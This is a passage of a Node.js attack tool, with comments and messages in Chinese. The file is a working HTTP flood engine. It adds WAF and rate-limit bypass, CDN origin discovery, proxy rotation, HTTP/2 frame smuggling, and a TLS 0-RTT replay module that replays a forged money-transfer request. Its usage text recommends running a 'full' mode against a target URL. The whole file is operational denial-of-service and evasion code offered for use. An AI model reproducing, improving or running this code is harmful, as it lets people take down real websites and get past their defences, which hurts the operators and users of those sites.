        resolve({ sessionId, alpn: socket.alpnProtocol || 'http/1.1' });
      });

      socket.on('error', (err) => {
        console.log(`  \x1b[33m[!]\x1b[37m 连接失败: ${err.message}`);
        reject(err);
      });

      socket.on('timeout', () => {
        socket.destroy();
        reject(new Error('TLS握手超时'));
      });

      socket.setTimeout(10000);
      socket.write('HEAD / HTTP/1.1\r\nHost: ' + this.host + '\r\n\r\n');
    });
  }

  prepareEarlyDataPayloads(method = 'POST', path = '/api') {
    this.earlyDataPayloads = [];
    this.earlyDataPayloads.push({
      name: 'API请求重放', method, path,
      headers: {
        'Host': this.host,
        'User-Agent': UAs[Math.floor(Math.random() * UAs.length)],
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Early-Data': '1',
      },
      body: JSON.stringify({
        action: 'test',
        id: Math.floor(Math.random() * 10000),
        timestamp: Date.now(),
        data: crypto.randomBytes(16).toString('hex'),
      }),
      timesToReplay: Math.floor(Math.random() * 3) + 2,
    });
    this.earlyDataPayloads.push({
      name: '敏感操作重放', method: 'POST', path: '/api/transfer',
      headers: { 'Host': this.host, 'Content-Type': 'application/json', 'Early-Data': '1' },
      body: JSON.stringify({ from: 'attacker', to: 'attacker2', amount: Math.floor(Math.random() * 1000), transactionId: crypto.randomBytes(4).toString('hex') }),
      timesToReplay: Math.floor(Math.random() * 2) + 1,
    });
    this.earlyDataPayloads.push({
      name: 'HTTP/2 0-RTT探测', method: 'GET', path: '/',
      headers: { ':authority': this.host, ':method': 'GET', ':path': '/', ':scheme': 'https', 'user-agent': UAs[Math.floor(Math.random() * UAs.length)], 'early-data': '1' },
      body: '', timesToReplay: 2, useHTTP2: true,
    });
    console.log(`\n\x1b[35m[0-RTT]\x1b[37m 准备了 ${this.earlyDataPayloads.length} 种重放负载`);
  }

  buildHTTP1EarlyData(payload) {
    const requestLine = `${payload.method} ${payload.path} HTTP/1.1\r\n`;
    let headers = '';
    for (const [key, value] of Object.entries(payload.headers)) {
      if (!key.startsWith(':')) headers += `${key}: ${value}\r\n`;
    }
    headers += `Content-Length: ${Buffer.byteLength(payload.body)}\r\n`;
    return requestLine + headers + '\r\n' + payload.body;
  }

  buildHTTP2EarlyDataFrame(payload) {
    const preface = Buffer.from('505249202a20485454502f322e300d0a0d0a534d0d0a0d0a', 'hex');
    const settingsFrame = Buffer.from([0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00]);
    const headersBlock = this._encodeHTTP2Headers(payload.headers, payload.path, payload.method);
    const streamId = 1;
    const headersFrame = Buffer.concat([
      Buffer.from([(headersBlock.length >> 16) & 0xFF, (headersBlock.length >> 8) & 0xFF, headersBlock.length & 0xFF]),
      Buffer.from([0x01, 0x05, 0x00, 0x00, 0x00, streamId]),
      headersBlock,
    ]);
    return Buffer.concat([preface, settingsFrame, headersFrame]);
  }

  _encodeHTTP2Headers(headers, path, method) {
    const encoded = [];
    encoded.push(0x80 | (method === 'GET' ? 2 : 3));
    encoded.push(0x40 | 4, ...Buffer.from(path));
    encoded.push(0x40 | 6, ...Buffer.from('https'));
    encoded.push(0x40 | 1, ...Buffer.from(headers[':authority'] || this.host));
    for (const [key, value] of Object.entries(headers)) {
      if (!key.startsWith(':')) {
        encoded.push(0x40, ...Buffer.from(key.toLowerCase()), ...Buffer.from(value));
      }
    }
    return Buffer.from(encoded.flat());
  }

  async executeReplay(sessionId, payload) {
    const sessionData = this.sessionCache.get(sessionId);
    if (!sessionData) { console.log(`  \x1b[31m[-]\x1b[37m 会话不存在`); return []; }
    const results = [];
    for (let i = 0; i < payload.timesToReplay; i++) {
      const result = await this._singleReplay(sessionData, payload, i);
      results.push(result);
      this.replayStats.total++;
      if (result.accepted) this.replayStats.accepted++;
      else this.replayStats.rejected++;
      await new Promise(r => setTimeout(r, Math.random() * 100 + 50));
    }
    return results;
  }

  _singleReplay(sessionData, payload, replayIndex) {
    return new Promise((resolve) => {
      try {
        const earlyData = payload.useHTTP2 ? this.buildHTTP2EarlyDataFrame(payload) : this.buildHTTP1EarlyData(payload);
        const socket = tls.connect({
          host: this.host, port: this.port,
          rejectUnauthorized: false,
          session: sessionData.ticket,
          ALPNProtocols: [sessionData.alpn],
          minVersion: 'TLSv1.3', maxVersion: 'TLSv1.3',
          earlyData: true,
        });
        socket.on('secureConnect', () => socket.write(earlyData));
        socket.on('data', (data) => {
          resolve({ name: payload.name, replayIndex, accepted: socket.earlyDataAccepted !== false, responseReceived: true, timestamp: Date.now() });
          socket.end();
        });
        socket.on('error', (err) => resolve({ name: payload.name, replayIndex, accepted: false, error: err.message }));
        socket.setTimeout(5000);
        socket.on('timeout', () => { socket.destroy(); resolve({ name: payload.name, replayIndex, accepted: false, error: 'timeout' }); });
      } catch (err) {
        resolve({ name: payload.name, replayIndex, accepted: false, error: 'Frame build error: ' + err.message });
      }
    });
  }

  async runFullAttack(method = 'POST', path = '/api') {
    console.log(`\n\x1b[35m╔══════════════════════════════════════╗\x1b[37m`);
    console.log(`\x1b[35m║     0-RTT 重放攻击引擎               ║\x1b[37m`);
    console.log(`\x1b[35m╚══════════════════════════════════════╝\x1b[37m`);
    try {
      console.log(`\n\x1b[35m[0-RTT 步骤1]\x1b[37m 建立TLS 1.3会话...`);
      let sessionData;
      try {
        sessionData = await this.establishSession();
      } catch (err) {
        console.log(`  \x1b[31m[-]\x1b[37m 无法建立TLS 1.3连接: ${err.message}`);
        return { success: false, reason: 'TLS 1.3不可用' };
      }
      console.log(`\n\x1b[35m[0-RTT 步骤2]\x1b[37m 准备重放负载...`);
      this.prepareEarlyDataPayloads(method, path);
      console.log(`\n\x1b[35m[0-RTT 步骤3]\x1b[37m 执行重放攻击...`);
      const allResults = [];
      for (const payload of this.earlyDataPayloads) {
        console.log(`  \x1b[33m[*]\x1b[37m 执行: ${payload.name} (重放${payload.timesToReplay}次)`);
        try {
          const results = await this.executeReplay(sessionData.sessionId, payload);
          allResults.push({ payload: payload.name, results });
        } catch (replayErr) {
          console.log(`    \x1b[31m[!]\x1b[37m 执行失败: ${replayErr.message}`);
          allResults.push({ payload: payload.name, error: replayErr.message });
        }
      }
      console.log(`\n\x1b[35m[0-RTT 统计]\x1b[37m`);
      console.log(`  总重放: ${this.replayStats.total} | 接受: ${this.replayStats.accepted} | 拒绝: ${this.replayStats.rejected}`);
      if (this.replayStats.accepted > 0) console.log(`\n  \x1b[31m[!]\x1b[37m ⚠️  目标存在0-RTT重放漏洞！`);
      else console.log(`\n  \x1b[32m[+]\x1b[37m 目标正确拒绝了所有0-RTT重放`);
      return { success: this.replayStats.accepted > 0, stats: this.replayStats, results: allResults };
    } catch (fatalErr) {
      console.log(`  \x1b[31m[-]\x1b[37m 0-RTT引擎致命错误: ${fatalErr.message}`);
      return { success: false, reason: fatalErr.message };
    }
  }
}

// ==================== 手动 HTTP/2 帧走私执行器 ====================
const FRAME_TYPES = { DATA: 0x0, HEADERS: 0x1, SETTINGS: 0x4, RST_STREAM: 0x3 };
const HTTP2_PREFACE = Buffer.from('505249202a20485454502f322e300d0a0d0a534d0d0a0d0a', 'hex');

function encodeHTTP2Headers(headers, method, path, authority) {
  const buf = [];
  if (method === 'GET') buf.push(0x80 | 2);
  else if (method === 'POST') buf.push(0x80 | 3);
  else if (method === 'OPTIONS') buf.push(0x40 | 1, ...Buffer.from(':method'), ...Buffer.from('OPTIONS'));
  else buf.push(0x40 | 1, ...Buffer.from(':method'), ...Buffer.from(method));
  buf.push(0x40 | 4, ...Buffer.from(path));
  buf.push(0x40 | 6, ...Buffer.from('https'));
  buf.push(0x40 | 1, ...Buffer.from(authority));
  for (const [key, value] of Object.entries(headers)) {
    if (key.startsWith(':')) continue;
    buf.push(0x40, ...Buffer.from(key.toLowerCase()), ...Buffer.from(value));
  }
  return Buffer.from(buf.flat());
}

function buildSettingsFrame() {
  return Buffer.from([0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00]);
}

function buildHeadersFrame(streamId, headersBlock, endStream = false) {
  const flags = endStream ? 0x05 : 0x04;
  const frameHeader = Buffer.alloc(9);
  frameHeader.writeUIntBE(headersBlock.length, 0, 3);
  frameHeader[3] = FRAME_TYPES.HEADERS;
  frameHeader[4] = flags;
  frameHeader.writeInt32BE(streamId, 5);
  return Buffer.concat([frameHeader, headersBlock]);
}

function buildDataFrame(streamId, data, endStream = true) {
  const frameHeader = Buffer.alloc(9);
  frameHeader.writeUIntBE(data.length, 0, 3);
  frameHeader[3] = FRAME_TYPES.DATA;
  frameHeader[4] = endStream ? 0x01 : 0x00;
  frameHeader.writeInt32BE(streamId, 5);
  return Buffer.concat([frameHeader, data]);
}

class H2SmugglingExecutor {
  constructor(host, port) {
    this.host = host;
    this.port = port || 443;
  }

  executeSmuggling(rawPayload, retries = 0) {
    return new Promise((resolve) => {
      const MAX_RETRIES = 1;
      const socket = tls.connect({
        host: this.host,
        port: this.port,
        rejectUnauthorized: false,
        ALPNProtocols: ['h2'],
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
      });

      let resolved = false;
      const safeResolve = (result) => {
        if (resolved) return;
        resolved = true;
        socket.destroy();
        resolve(result);
      };

      socket.on('secureConnect', () => {
        socket.write(HTTP2_PREFACE);
        socket.write(buildSettingsFrame());
        const method = rawPayload.method || 'GET';
        const path = rawPayload.pseudoHeaders[':path'] || '/';
        const customHeaders = rawPayload.customHeaders || {};
        if (!customHeaders['user-agent']) {
          customHeaders['user-agent'] = UAs[Math.floor(Math.random() * UAs.length)];
        }
        try {
          const headersBlock = encodeHTTP2Headers(customHeaders, method, path, this.host);
          const streamId = 1;
          const endStream = !rawPayload.body;
          socket.write(buildHeadersFrame(streamId, headersBlock, endStream));
          if (rawPayload.body) {
            socket.write(buildDataFrame(streamId, Buffer.from(rawPayload.body), true));
          }
        } catch (err) {
          safeResolve({ success: false, name: rawPayload.name, error: 'Frame build: ' + err.message });
        }
      });

      socket.on('data', () => {
        safeResolve({ success: true, name: rawPayload.name, status: 'sent (raw h2)' });
      });

      socket.on('error', (err) => {
        if (retries < MAX_RETRIES && err.code === 'ECONNRESET') {
          this.executeSmuggling(rawPayload, retries + 1).then(resolve);
        } else {
          safeResolve({ success: false, name: rawPayload.name, error: err.message });
        }
      });

      socket.setTimeout(10000);
      socket.on('timeout', () => {
        safeResolve({ success: true, name: rawPayload.name, status: 'timeout (possible success)' });
      });
    });
  }

  async runAllPayloads() {
    console.log(`\n\x1b[35m[H2走私]\x1b[37m 手动构造帧，执行 ${H2_SMUGGLING_PAYLOADS.length} 个负载...`);
    const results = [];
    for (const payload of H2_SMUGGLING_PAYLOADS) {
      payload.pseudoHeaders[':authority'] = this.host;
      const result = await this.executeSmuggling(payload);
      results.push(result);
      console.log(`  \x1b[${result.success ? '32' : '31'}m[${result.success ? '+' : '-'}]\x1b[37m ${payload.name}: ${result.status || result.error || '失败'}`);
    }
    const successCount = results.filter(r => r.success).length;
    console.log(`  \x1b[36m[结果]\x1b[37m ${successCount}/${results.length} 负载发送成功`);
    return results;
  }
}

// ==================== 自动武器切换管理器 ====================
class AutoWeaponSwitcher {
  constructor(host, port, availableWeapons) {
    this.host = host;
    this.port = port;
    this.weapons = availableWeapons;
    this.currentWeapon = 0;
    this.switchInterval = 30000;
    this.isRunning = false;
    this.switchTimer = null;
  }

  getCurrentWeapon() { return this.weapons[this.currentWeapon % this.weapons.length]; }

  switchToNext() {
    this.currentWeapon = (this.currentWeapon + 1) % this.weapons.length;
    const weapon = this.getCurrentWeapon();
    console.log(`\n\x1b[35m[武器切换]\x1b[37m → ${weapon.name}: ${weapon.description}`);
    return weapon;
  }

  startAutoSwitch(onSwitch) {
    this.isRunning = true;
    const doSwitch = () => {
      if (!this.isRunning) return;
      const weapon = this.switchToNext();
      if (onSwitch) onSwitch(weapon);
      this.switchTimer = setTimeout(doSwitch, this.switchInterval);
    };
    doSwitch();
  }

  stop() {
    this.isRunning = false;
    if (this.switchTimer) clearTimeout(this.switchTimer);
  }
}

// ==================== 辅助类 ====================
class EnhancedRandomSpeedController {
  constructor() {
    this.minInterval = 1; this.maxInterval = 100;
    this.currentInterval = this.getRandomInterval();
    this.nextChangeTime = Date.now() + Math.floor(Math.random() * 150000) + 30000;
  }
  getRandomInterval() { return Math.floor(Math.random() * 100) + 1; }
  getCurrentInterval() {
    if (Date.now() >= this.nextChangeTime) {
      this.currentInterval = this.getRandomInterval();
      this.nextChangeTime = Date.now() + Math.floor(Math.random() * 150000) + 30000;
    }
    return this.currentInterval;
  }
  getSpeedDescription() { return `${Math.round(1000 / this.currentInterval)} 请求/秒`; }
}

class RandomDurationGenerator {
  static getRandomDuration(minMinutes = 40, maxMinutes = 480) {
    return Math.floor(Math.random() * (maxMinutes - minMinutes + 1)) * 60 * 1000 + minMinutes * 60 * 1000;
  }
  static formatDuration(ms) {
    const hours = Math.floor(ms / 3600000);
    const minutes = Math.floor((ms % 3600000) / 60000);
    const seconds = Math.floor((ms % 60000) / 1000);
    return hours > 0 ? `${hours}h${minutes}m${seconds}s` : minutes > 0 ? `${minutes}m${seconds}s` : `${seconds}s`;
  }
}

// ==================== 参数解析（修复 NaN 问题） ====================
function parseArguments() {
  const args = {
    target: null, proxyFile: null, duration: null, threads: null,
    method: 'GET', waf: false, randomSpeed: false, cdn: false,
    originIP: null, cacheBypass: false, originPull: false,
    h2Smuggle: false, zerortt: false, autoSwitch: false,
    waffled: false, paramPollution: false, rateLimitBypass: true,
    interval: 10, requestsPerConnection: 5,
  };

  const argv = [...process.argv];
  const flagToKey = {
    '--waf': 'waf', '--random-speed': 'randomSpeed', '--cdn': 'cdn',
    '--cache-bypass': 'cacheBypass', '--origin-pull': 'originPull',
    '--h2-smuggle': 'h2Smuggle', '--zerortt': 'zerortt', '--auto-switch': 'autoSwitch',
    '--waffled': 'waffled', '--param-pollution': 'paramPollution',
    '--no-rate-limit-bypass': 'rateLimitBypass',
  };

  Object.entries(flagToKey).forEach(([flag, key]) => {
    const idx = argv.indexOf(flag);
    if (idx !== -1) {
      if (flag === '--no-rate-limit-bypass') args.rateLimitBypass = false;
      else args[key] = true;
      argv.splice(idx, 1);
    }
  });

  const oiIdx = argv.indexOf('--origin-ip');
  if (oiIdx !== -1 && oiIdx + 1 < argv.length) {
    args.originIP = argv[oiIdx + 1]; args.cdn = true; argv.splice(oiIdx, 2);
  }

  const modeIdx = argv.indexOf('--mode');
  if (modeIdx !== -1 && modeIdx + 1 < argv.length) {
    const mode = argv[modeIdx + 1];
    switch (mode) {
      case 'stealth':
        args.waf = true; args.cacheBypass = true; args.rateLimitBypass = true;
        break;
      case 'aggressive':
        args.waf = true; args.cacheBypass = true; args.originPull = true; args.rateLimitBypass = true;
        break;
      case 'waffled':
        args.waf = true; args.waffled = true; args.originPull = true; args.rateLimitBypass = true;
        break;
      case 'full':
        args.waf = true; args.cacheBypass = true; args.originPull = true;
        args.waffled = true; args.paramPollution = true; args.rateLimitBypass = true;
        break;
    }
    argv.splice(modeIdx, 2);
  }

  // 检查最少参数：target, duration, threads (3个)
  if (argv.length < 5) {
    console.log('\x1b[31m[错误]\x1b[37m 参数不足，至少需要 <目标URL> <持续秒> <线程数>');
    console.log('\x1b[36m[用法]\x1b[37m node ' + fileName + ' <目标URL> <持续秒> <线程数> [选项]');
    console.log('\x1b[33m[快捷模式 --mode]\x1b[37m stealth / aggressive / waffled / full');
    return null;
  }

  args.target = argv[2];
  let pi = 3;

  // 可选的代理文件
  if (pi < argv.length && argv[pi].includes('.') && isNaN(parseInt(argv[pi]))) {
    args.proxyFile = argv[pi++];
  }

  // 持续时间（必选）
  if (pi < argv.length) {
    const d = parseInt(argv[pi]);
    if (isNaN(d) || d <= 0) {
      console.log('\x1b[31m[错误]\x1b[37m 持续时间必须是正整数，当前值: ' + argv[pi]);
      return null;
    }
    args.duration = d;
    pi++;
  } else {
    console.log('\x1b[31m[错误]\x1b[37m 缺少持续时间参数');
    return null;
  }

  // 线程数（必选）
  if (pi < argv.length) {
    const t = parseInt(argv[pi]);
    if (isNaN(t) || t <= 0) {
      console.log('\x1b[31m[错误]\x1b[37m 线程数必须是正整数，当前值: ' + argv[pi]);
      return null;
    }
    args.threads = t;
    pi++;
  } else {
    console.log('\x1b[31m[错误]\x1b[37m 缺少线程数参数');
    return null;
  }

  // 可选：间隔
  if (pi < argv.length && !isNaN(parseInt(argv[pi])) && argv[pi].indexOf('--') !== 0) {
    args.interval = parseInt(argv[pi++]);
    if (args.interval < 1) {
      console.log('\x1b[31m[错误]\x1b[37m 间隔必须大于0');
      return null;
    }
  }

  // 可选：每连接请求数
  if (pi < argv.length && !isNaN(parseInt(argv[pi])) && argv[pi].indexOf('--') !== 0) {
    args.requestsPerConnection = parseInt(argv[pi++]);
  }

  // 可选：方法
  if (pi < argv.length && argv[pi].indexOf('--') !== 0) {
    args.method = argv[pi++].toUpperCase();
  }

  return args;
}

// ==================== 请求发送 ====================
function sendDirectRequest(isHttps, host, port, path, method, wafBypass, callback, proxyManager) {
  const randomMethod = wafBypass.getRandomMethod(method);
  const randomPath = wafBypass.getRandomPath(path);
  const headers = wafBypass.getRandomHeaders(randomMethod);
  headers['Host'] = host;
  headers['User-Agent'] = wafBypass.getRandomUserAgent();
  if (Math.random() > 0.5) headers['Cookie'] = wafBypass.generateRandomCookies();

  const options = {
    hostname: host, port: port, path: randomPath,
    method: randomMethod, headers: headers,
    timeout: 5000, rejectUnauthorized: false,
  };

  let body = null;
  if (['POST', 'PUT', 'PATCH'].includes(randomMethod)) {
    body = wafBypass.getMethodSpecificBody(randomMethod);
    if (body) options.headers['Content-Length'] = Buffer.byteLength(body);
  }

  const req = (isHttps ? https : http).request(options, res => {
    res.on('data', () => {});
    res.on('end', () => callback(true));
  });
  req.on('error', () => callback(false));
  req.on('timeout', () => { req.destroy(); callback(false); });
  if (body) req.write(body);
  req.end();
}

// ==================== 主攻击函数 ====================
async function startAttack() {
  const args = parseArguments();
  if (!args) process.exit(1);

  let { target, proxyFile, duration, threads, method, waf, randomSpeed, cdn, originIP,
        cacheBypass, originPull, h2Smuggle, zerortt, autoSwitch, interval,
        waffled, paramPollution, rateLimitBypass } = args;

  // 防御性校验，防止 NaN 传播
  if (isNaN(duration) || duration <= 0) {
    console.log('\x1b[31m[错误]\x1b[37m 持续时间无效，请检查参数');
    process.exit(1);
  }
  if (isNaN(threads) || threads <= 0) {
    console.log('\x1b[31m[错误]\x1b[37m 线程数无效，请检查参数');
    process.exit(1);
  }

  let parsed;
  try { parsed = new URL(target); } catch (err) { console.log('无效URL'); process.exit(1); }

  let actualHost = parsed.hostname;
  let actualPort = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
  let actualIsHttps = parsed.protocol === 'https:';
  let cdnHeaders = {};

  // 加载代理
  let proxyManager = null;
  if (proxyFile) {
    try {
      if (fs.existsSync(proxyFile)) {
        const content = fs.readFileSync(proxyFile, 'utf-8');
        const proxyList = content.replace(/\r/g, '').split('\n')
          .filter(line => line.trim() !== '' && line.includes(':'));
        proxyManager = new SmartProxyManager(proxyList, { strategy: 'adaptive' });
        console.log(`\n\x1b[36m[代理]\x1b[37m 加载 ${proxyList.length} 个代理，自适应评分管理`);
      }
    } catch (e) {
      console.log(`\x1b[33m[代理]\x1b[37m 加载失败: ${e.message}`);
    }
  }

  // 阶段0：CDN穿透
  if (cdn) {
    if (originIP) {
      actualHost = originIP;
      console.log(`\n\x1b[35m[CDN穿透]\x1b[37m 手动源站IP: ${originIP}`);
    } else {
      try {
        const engine = new AdvancedCDNBypassEngine(parsed.hostname);
        const found = await engine.run();
        cdnHeaders = engine.getInjectionHeaders();
        if (found) actualHost = found;
      } catch (err) {
        console.log(`\x1b[31m[CDN穿透异常]\x1b[37m ${err.message}，跳过`);
      }
    }
  }

  // 阶段1：HTTP/2走私
  if (h2Smuggle) {
    try {
      const smuggler = new H2SmugglingExecutor(actualHost, actualPort);
      await smuggler.runAllPayloads();
    } catch (err) {
      console.log(`\x1b[31m[H2走私异常]\x1b[37m ${err.message}，跳过`);
    }
  }

  // 阶段2：0-RTT重放
  if (zerortt) {
    try {
      const replayEngine = new ZeroRTTReplayEngine(actualHost, actualPort);
      const replayResult = await replayEngine.runFullAttack(method);
      console.log(`\n\x1b[35m[0-RTT结果]\x1b[37m ${replayResult.success ? '\x1b[31m存在漏洞' : '\x1b[32m安全'}\x1b[37m`);
    } catch (err) {
      console.log(`\x1b[31m[0-RTT异常]\x1b[37m ${err.message}，跳过此阶段继续攻击`);
    }
  }

  // 阶段3：WAF绕过引擎初始化
  const wafBypass = new EnhancedWAFBypass({
    enabled: waf || cdn || cacheBypass || originPull || waffled || paramPollution,
    randomSpeedEnabled: randomSpeed,
    cdnHeaders: cdnHeaders,
    cacheBypassEnabled: cacheBypass,
    originPullEnabled: originPull,
    rateLimitBypassEnabled: rateLimitBypass,
    waffledEnabled: waffled,
    paramPollutionEnabled: paramPollution,
  });

  const baseDuration = duration * 1000;
  const speedController = randomSpeed ? new EnhancedRandomSpeedController() : { getCurrentInterval: () => interval };
  const startTime = Date.now();
  const endTime = startTime + baseDuration;

  const stats = { totalRequests: 0, failedRequests: 0 };

  // 自动武器切换
  if (autoSwitch) {
    const weapons = [
      { name: 'WAF绕过', description: 'Header混淆+UA轮换', enabled: () => { wafBypass.techniques.headerVariation = true; } },
      { name: '缓存穿透', description: '随机参数+Cache-Control操纵', enabled: () => { wafBypass.techniques.cacheBypass = true; } },
      { name: '动态回源', description: 'API路径优先+动态参数', enabled: () => { wafBypass.techniques.originPull = true; } },
      { name: 'WAFFLED混合', description: '解析差异+Content-Type切换', enabled: () => {
        wafBypass.techniques.waffledMultipart = true;
        wafBypass.techniques.waffledJSON = true;
        wafBypass.techniques.paramPollution = true;
      }},
      { name: '全武器', description: '所有技术同时启用', enabled: () => {
        wafBypass.techniques.headerVariation = true;
        wafBypass.techniques.cacheBypass = true;
        wafBypass.techniques.originPull = true;
        wafBypass.techniques.waffledMultipart = true;
        wafBypass.techniques.waffledJSON = true;
        wafBypass.techniques.paramPollution = true;
      }},
    ];
    const switcher = new AutoWeaponSwitcher(actualHost, actualPort, weapons);
    switcher.startAutoSwitch((weapon) => weapon.enabled());
  }

  console.log(`\n╔══════════════════════════════════════╗`);
  console.log(`║          攻击参数                    ║`);
  console.log(`╚══════════════════════════════════════╝\n`);
  console.log(`目标: ${actualHost}:${actualPort}`);
  console.log(`方法: ${method} | 时长: ${duration}s | 线程: ${threads}`);
  console.log(`WAF绕过: ${waf ? '✅' : '❌'} | CDN穿透: ${cdn ? '✅' : '❌'}`);
  console.log(`缓存穿透: ${cacheBypass ? '✅' : '❌'} | 动态回源: ${originPull ? '✅' : '❌'}`);
  console.log(`速率绕过: ${rateLimitBypass ? '✅' : '❌'} | WAFFLED: ${waffled ? '✅' : '❌'}`);
  console.log(`参数污染: ${paramPollution ? '✅' : '❌'} | 代理: ${proxyManager ? '✅' : '❌'}`);
  console.log(`H2走私: ${h2Smuggle ? '✅' : '❌'} | 0-RTT: ${zerortt ? '✅' : '❌'}`);
  console.log(`自动切换: ${autoSwitch ? '✅' : '❌'} | 随机速度: ${randomSpeed ? '✅' : '❌'}\n`);

  console.log('\x1b[33m[启动] 攻击开始，按 Ctrl+C 停止\n');

  // 启动工作线程
  const stopFunctions = [];
  for (let i = 0; i < threads; i++) {
    setTimeout(() => {
      let isRunning = true;
      const loop = () => {
        if (!isRunning || Date.now() >= endTime) { isRunning = false; return; }
        const currentInterval = speedController.getCurrentInterval();
        sendDirectRequest(actualIsHttps, actualHost, actualPort, '/', method, wafBypass, (success) => {
          stats.totalRequests++;
          if (!success) stats.failedRequests++;
        }, proxyManager);
        setTimeout(loop, currentInterval);
      };
      loop();
      stopFunctions.push(() => { isRunning = false; });
      console.log(`\x1b[33m[线程${i+1}]\x1b[37m 已启动`);
    }, Math.random() * 5000);
  }

  // 实时统计
  let lastTotal = 0;
  const statsTimer = setInterval(() => {
    const rate = stats.totalRequests - lastTotal;
    lastTotal = stats.totalRequests;
    const elapsed = (Date.now() - startTime) / 1000;
    const avgRate = elapsed > 0 ? Math.round(stats.totalRequests / elapsed) : 0;
    const progress = ((Date.now() - startTime) / baseDuration * 100).toFixed(1);
    const failRate = stats.totalRequests + stats.failedRequests > 0
      ? (stats.failedRequests / (stats.totalRequests + stats.failedRequests) * 100).toFixed(1) : '0.0';

    console.log(`\x1b[36m[统计]\x1b[37m 请求:${stats.totalRequests} 失败:${stats.failedRequests}(${failRate}%) 当前:${rate}/s 平均:${avgRate}/s 进度:${progress}%`);

    if (Date.now() >= endTime) {
      clearInterval(statsTimer);
      stopFunctions.forEach(fn => fn());
      const elapsed = (Date.now() - startTime) / 1000;
      console.log(`\n\x1b[32m✅ 攻击完成\x1b[37m 总请求:${stats.totalRequests} 失败:${stats.failedRequests} 成功率:${stats.totalRequests > 0 ? ((stats.totalRequests - stats.failedRequests) / stats.totalRequests * 100).toFixed(2) : 0}% 时长:${elapsed.toFixed(2)}s`);
      process.exit(0);
    }
  }, 1000);

  setTimeout(() => { clearInterval(statsTimer); stopFunctions.forEach(fn => fn()); process.exit(0); }, baseDuration + 2000);
  process.on('SIGINT', () => { clearInterval(statsTimer); stopFunctions.forEach(fn => fn()); process.exit(0); });
}

function main() {
  if (require.main === module && process.argv.length > 2) startAttack();
  else if (require.main === module) {
    console.log('\n用法: node ' + fileName + ' <目标URL> <持续秒> <线程数> [选项]');
    console.log('\n快捷模式: --mode stealth|aggressive|waffled|full');
    console.log('推荐命令:');
    console.log('  node ' + fileName + ' https://target.com 300 10 --mode full --cdn --h2-smuggle --auto-switch --random-speed');
  }
}

if (require.main === module) main();
module.exports = { startAttack, EnhancedWAFBypass, ZeroRTTReplayEngine, AdvancedCDNBypassEngine, H2SmugglingExecutor };